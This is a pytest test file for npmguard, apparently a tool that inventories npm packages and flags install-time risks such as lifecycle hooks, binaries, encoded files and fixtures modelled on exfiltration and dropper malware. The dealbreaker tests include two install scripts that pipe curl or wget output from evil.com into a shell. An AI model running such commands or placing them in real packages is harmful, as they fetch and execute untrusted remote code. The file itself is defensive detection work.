"""Tests for Phase 0 — Inventory."""

from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path

from npmguard.inventory.checks import run_inventory_checks
from npmguard.inventory.classify import classify_files
from npmguard.inventory.models import (
    EntryPoints,
    FileRecord,
    Severity,
)
from npmguard.inventory.parse_manifest import (
    extract_script_file_ref,
    parse_package_json,
)

_PROJECT_ROOT = Path(__file__).parent.parent.parent
_FIXTURES = _PROJECT_ROOT / "sandbox" / "test-fixtures"


# ---------------------------------------------------------------------------
# parse_manifest.py
# ---------------------------------------------------------------------------


class TestExtractScriptFileRef:
    def test_simple_node_command(self):
        assert extract_script_file_ref("node setup.js") == "setup.js"

    def test_node_with_flags(self):
        assert extract_script_file_ref("node --experimental-vm-modules test.js") == "test.js"

    def test_non_node_command(self):
        assert extract_script_file_ref("echo hello") is None

    def test_empty_string(self):
        assert extract_script_file_ref("") is None

    def test_node_only_no_file(self):
        assert extract_script_file_ref("node --version") is None

    def test_node_with_path(self):
        assert extract_script_file_ref("node scripts/pre.js") == "scripts/pre.js"


class TestParsePackageJson:
    def test_extracts_metadata(self):
        pkg = {"name": "foo", "version": "1.0.0", "description": "A package", "license": "MIT"}
        metadata, _, _, _ = parse_package_json(pkg)
        assert metadata.name == "foo"
        assert metadata.version == "1.0.0"
        assert metadata.description == "A package"
        assert metadata.license == "MIT"

    def test_missing_fields_default_to_none(self):
        metadata, _, _, _ = parse_package_json({})
        assert metadata.name is None
        assert metadata.version is None

    def test_extracts_install_entry_points(self):
        pkg = {"scripts": {"postinstall": "node install-hook.js"}}
        _, _, entry_points, _ = parse_package_json(pkg)
        assert entry_points.install == ["install-hook.js"]

    def test_non_node_scripts_not_in_install_entries(self):
        pkg = {"scripts": {"postinstall": "echo done"}}
        _, _, entry_points, _ = parse_package_json(pkg)
        assert entry_points.install == []

    def test_runtime_defaults_to_index_js(self):
        _, _, entry_points, _ = parse_package_json({})
        assert "index.js" in entry_points.runtime

    def test_runtime_uses_main_field(self):
        pkg = {"main": "lib/main.js"}
        _, _, entry_points, _ = parse_package_json(pkg)
        assert "lib/main.js" in entry_points.runtime

    def test_extracts_bin_entries(self):
        pkg = {"bin": {"cli": "./bin/cli.js"}}
        _, _, entry_points, _ = parse_package_json(pkg)
        assert entry_points.bin == ["./bin/cli.js"]

    def test_extracts_string_bin(self):
        pkg = {"bin": "./bin/cli.js"}
        _, _, entry_points, _ = parse_package_json(pkg)
        assert entry_points.bin == ["./bin/cli.js"]

    def test_extracts_exports(self):
        pkg = {"exports": {".": "./lib/index.js", "./utils": "./lib/utils.js"}}
        _, _, entry_points, _ = parse_package_json(pkg)
        assert "./lib/index.js" in entry_points.runtime
        assert "./lib/utils.js" in entry_points.runtime

    def test_extracts_dependencies(self):
        pkg = {
            "dependencies": {"a": "^1.0.0"},
            "devDependencies": {"b": "^2.0.0"},
            "optionalDependencies": {"c": "^3.0.0"},
            "peerDependencies": {"d": "^4.0.0"},
        }
        _, _, _, deps = parse_package_json(pkg)
        assert deps["prod"] == {"a": "^1.0.0"}
        assert deps["dev"] == {"b": "^2.0.0"}
        assert deps["optional"] == {"c": "^3.0.0"}
        assert deps["peer"] == {"d": "^4.0.0"}

    def test_real_fixture_dns_exfil(self):
        pkg_path = _FIXTURES / "test-pkg-dns-exfil" / "package.json"
        with open(pkg_path) as f:
            pkg = json.load(f)
        metadata, scripts, entry_points, _ = parse_package_json(pkg)
        assert metadata.name == "test-pkg-dns-exfil"
        assert "postinstall" in scripts
        assert "install-hook.js" in entry_points.install


# ---------------------------------------------------------------------------
# classify.py
# ---------------------------------------------------------------------------


class TestClassifyFiles:
    def test_classifies_js_files(self):
        fixture = str(_FIXTURES / "test-pkg-dos-loop")
        records = classify_files(fixture)
        js_files = [r for r in records if r.file_type == "js"]
        assert len(js_files) >= 1

    def test_classifies_json_files(self):
        fixture = str(_FIXTURES / "test-pkg-dos-loop")
        records = classify_files(fixture)
        json_files = [r for r in records if r.file_type == "json"]
        assert any(r.path == "package.json" for r in json_files)

    def test_enc_file_is_unknown(self):
        fixture = str(_FIXTURES / "test-pkg-dns-exfil")
        records = classify_files(fixture)
        enc = [r for r in records if r.path.endswith(".enc")]
        assert len(enc) == 1
        assert enc[0].file_type == "unknown"

    def test_html_file_is_web(self):
        fixture = str(_FIXTURES / "test-pkg-dom-inject")
        records = classify_files(fixture)
        html = [r for r in records if r.path.endswith(".html")]
        assert len(html) >= 1
        assert html[0].file_type == "web"

    def test_txt_file_is_doc(self):
        fixture = str(_FIXTURES / "test-pkg-filesystem-wiper")
        records = classify_files(fixture)
        txt = [r for r in records if r.file_type == "doc"]
        assert len(txt) >= 1

    def test_reports_file_size(self):
        fixture = str(_FIXTURES / "test-pkg-dos-loop")
        records = classify_files(fixture)
        for r in records:
            assert r.size_bytes >= 0

    def test_binary_detection_no_false_positives(self):
        fixture = str(_FIXTURES / "test-pkg-dos-loop")
        records = classify_files(fixture)
        assert not any(r.is_binary for r in records)

    def test_binary_detection_with_elf(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            elf_path = os.path.join(tmpdir, "payload")
            with open(elf_path, "wb") as f:
                f.write(b"\x7fELF" + b"\x00" * 100)
            records = classify_files(tmpdir)
            assert len(records) == 1
            assert records[0].is_binary
            assert records[0].binary_type == "ELF"
            assert records[0].file_type == "binary"


# ---------------------------------------------------------------------------
# checks.py
# ---------------------------------------------------------------------------


def _make_files(*paths: str) -> list[FileRecord]:
    return [
        FileRecord(
            path=p, file_type="js", size_bytes=100,
            permissions="644", is_binary=False,
        )
        for p in paths
    ]


class TestDealbreakers:
    def test_shell_pipe_curl_sh(self):
        scripts = {"preinstall": "curl https://evil.com/payload | sh"}
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        _, dealbreaker = run_inventory_checks(scripts, entry_points, [], "")
        assert dealbreaker is not None
        assert dealbreaker.check == "shell-pipe"

    def test_shell_pipe_wget_bash(self):
        scripts = {"postinstall": "wget https://evil.com/x | bash"}
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        _, dealbreaker = run_inventory_checks(scripts, entry_points, [], "")
        assert dealbreaker is not None
        assert dealbreaker.check == "shell-pipe"

    def test_no_dealbreaker_for_normal_scripts(self):
        scripts = {"postinstall": "node setup.js"}
        files = _make_files("setup.js")
        entry_points = EntryPoints(install=["setup.js"], runtime=["index.js"], bin=[])
        _, dealbreaker = run_inventory_checks(scripts, entry_points, files, "")
        assert dealbreaker is None

    def test_missing_install_script_file(self):
        scripts = {"preinstall": "node setup.js"}
        entry_points = EntryPoints(install=["setup.js"], runtime=["index.js"], bin=[])
        _, dealbreaker = run_inventory_checks(scripts, entry_points, [], "")
        assert dealbreaker is not None
        assert dealbreaker.check == "missing-install-script"

    def test_install_script_file_exists(self):
        scripts = {"preinstall": "node setup.js"}
        files = _make_files("setup.js")
        entry_points = EntryPoints(install=["setup.js"], runtime=["index.js"], bin=[])
        _, dealbreaker = run_inventory_checks(scripts, entry_points, files, "")
        assert dealbreaker is None


class TestFlags:
    def test_lifecycle_scripts_flag(self):
        scripts = {"postinstall": "node setup.js"}
        files = _make_files("setup.js")
        entry_points = EntryPoints(install=["setup.js"], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks(scripts, entry_points, files, "")
        lifecycle_flags = [f for f in flags if f.check == "lifecycle-scripts"]
        assert len(lifecycle_flags) == 1
        assert lifecycle_flags[0].severity == Severity.INFO

    def test_no_lifecycle_flag_without_hooks(self):
        scripts = {"test": "echo hi"}
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks(scripts, entry_points, [], "")
        assert not any(f.check == "lifecycle-scripts" for f in flags)

    def test_non_node_script_flag(self):
        scripts = {"postinstall": "echo done"}
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks(scripts, entry_points, [], "")
        non_node = [f for f in flags if f.check == "non-node-script"]
        assert len(non_node) == 1
        assert non_node[0].severity == Severity.WARN

    def test_binary_file_flag(self):
        files = [
            FileRecord(
                path="bin/payload", file_type="binary", size_bytes=1000,
                permissions="755", is_binary=True, binary_type="ELF",
            )
        ]
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks({}, entry_points, files, "")
        binary_flags = [f for f in flags if f.check == "binary-detected"]
        assert len(binary_flags) == 1

    def test_executable_outside_bin_flag(self):
        files = [
            FileRecord(
                path="setup.sh", file_type="shell", size_bytes=100,
                permissions="755", is_binary=False,
            )
        ]
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks({}, entry_points, files, "")
        exec_flags = [f for f in flags if f.check == "executable-outside-bin"]
        assert len(exec_flags) == 1

    def test_no_executable_flag_inside_bin(self):
        files = [
            FileRecord(
                path="bin/cli.js", file_type="js", size_bytes=100,
                permissions="755", is_binary=False,
            )
        ]
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks({}, entry_points, files, "")
        assert not any(f.check == "executable-outside-bin" for f in flags)

    def test_unusual_extension_flag(self):
        files = [
            FileRecord(
                path="lib/stage2.enc", file_type="unknown", size_bytes=5000,
                permissions="644", is_binary=False,
            )
        ]
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks({}, entry_points, files, "")
        ext_flags = [f for f in flags if f.check == "unusual-extension"]
        assert len(ext_flags) == 1
        assert ext_flags[0].file == "lib/stage2.enc"

    def test_encoded_content_in_enc_file(self):
        fixture = str(_FIXTURES / "test-pkg-dns-exfil")
        records = classify_files(fixture)
        pkg_path = _FIXTURES / "test-pkg-dns-exfil" / "package.json"
        with open(pkg_path) as f:
            pkg = json.load(f)
        _, scripts, entry_points, _ = parse_package_json(pkg)
        flags, _ = run_inventory_checks(scripts, entry_points, records, fixture)
        encoded = [f for f in flags if f.check == "encoded-content"]
        assert len(encoded) >= 1
        assert any("stage2.enc" in (f.file or "") for f in encoded)

    def test_hidden_dotfile_flag(self):
        files = [
            FileRecord(
                path=".hidden-config", file_type="unknown", size_bytes=100,
                permissions="644", is_binary=False,
            )
        ]
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks({}, entry_points, files, "")
        dot_flags = [f for f in flags if f.check == "hidden-dotfile"]
        assert len(dot_flags) == 1

    def test_standard_dotfile_not_flagged(self):
        files = [
            FileRecord(
                path=".gitignore", file_type="unknown", size_bytes=100,
                permissions="644", is_binary=False,
            )
        ]
        entry_points = EntryPoints(install=[], runtime=["index.js"], bin=[])
        flags, _ = run_inventory_checks({}, entry_points, files, "")
        assert not any(f.check == "hidden-dotfile" for f in flags)


# ---------------------------------------------------------------------------
# Integration: full inventory against test fixtures
# ---------------------------------------------------------------------------


class TestFixtureIntegration:
    """Run full inventory pipeline against each test fixture."""

    def _run_inventory(self, fixture_name: str):
        """Helper: run the inventory pipeline (without Temporal) for a fixture."""
        fixture_path = str(_FIXTURES / fixture_name)
        pkg_path = os.path.join(fixture_path, "package.json")
        with open(pkg_path) as f:
            pkg = json.load(f)
        metadata, scripts, entry_points, deps = parse_package_json(pkg)
        files = classify_files(fixture_path)
        flags, dealbreaker = run_inventory_checks(scripts, entry_points, files, fixture_path)
        return metadata, scripts, entry_points, deps, files, flags, dealbreaker

    def test_dns_exfil(self):
        metadata, _, _, _, _, flags, dealbreaker = self._run_inventory("test-pkg-dns-exfil")
        assert metadata.name == "test-pkg-dns-exfil"
        assert dealbreaker is None
        checks = {f.check for f in flags}
        assert "lifecycle-scripts" in checks
        assert "unusual-extension" in checks
        assert "encoded-content" in checks

    def test_env_exfil(self):
        metadata, _, entry_points, _, _, flags, dealbreaker = self._run_inventory("test-pkg-env-exfil")
        assert metadata.name == "test-pkg-env-exfil"
        assert dealbreaker is None
        assert "setup.js" in entry_points.install
        assert any(f.check == "lifecycle-scripts" for f in flags)

    def test_lifecycle_hook(self):
        _, _, entry_points, _, _, flags, dealbreaker = self._run_inventory("test-pkg-lifecycle-hook")
        assert dealbreaker is None
        assert "preinstall.js" in entry_points.install
        assert any(f.check == "lifecycle-scripts" for f in flags)

    def test_obfuscated_dropper(self):
        _, _, entry_points, _, _, flags, dealbreaker = self._run_inventory("test-pkg-obfuscated-dropper")
        assert dealbreaker is None
        assert "setup.js" in entry_points.install
        assert any(f.check == "lifecycle-scripts" for f in flags)

    def test_filesystem_wiper(self):
        _, _, _, _, _, flags, dealbreaker = self._run_inventory("test-pkg-filesystem-wiper")
        assert dealbreaker is None
        assert any(f.check == "lifecycle-scripts" for f in flags)

    def test_dos_loop(self):
        _, _, _, _, _, flags, dealbreaker = self._run_inventory("test-pkg-dos-loop")
        assert dealbreaker is None
        assert not any(f.check == "lifecycle-scripts" for f in flags)

    def test_dom_inject(self):
        _, _, _, _, files, flags, dealbreaker = self._run_inventory("test-pkg-dom-inject")
        assert dealbreaker is None
        assert not any(f.check == "lifecycle-scripts" for f in flags)
        assert any(r.file_type == "web" for r in files)

    def test_encrypted_payload(self):
        _, _, _, _, _, flags, dealbreaker = self._run_inventory("test-pkg-encrypted-payload")
        assert dealbreaker is None
        assert not any(f.check == "lifecycle-scripts" for f in flags)

    def test_no_false_dealbreakers(self):
        """None of the 8 test fixtures should trigger a dealbreaker."""
        for fixture in _FIXTURES.iterdir():
            if not fixture.is_dir() or not fixture.name.startswith("test-pkg-"):
                continue
            _, _, _, _, _, _, dealbreaker = self._run_inventory(fixture.name)
            assert dealbreaker is None, f"False dealbreaker in {fixture.name}: {dealbreaker}"
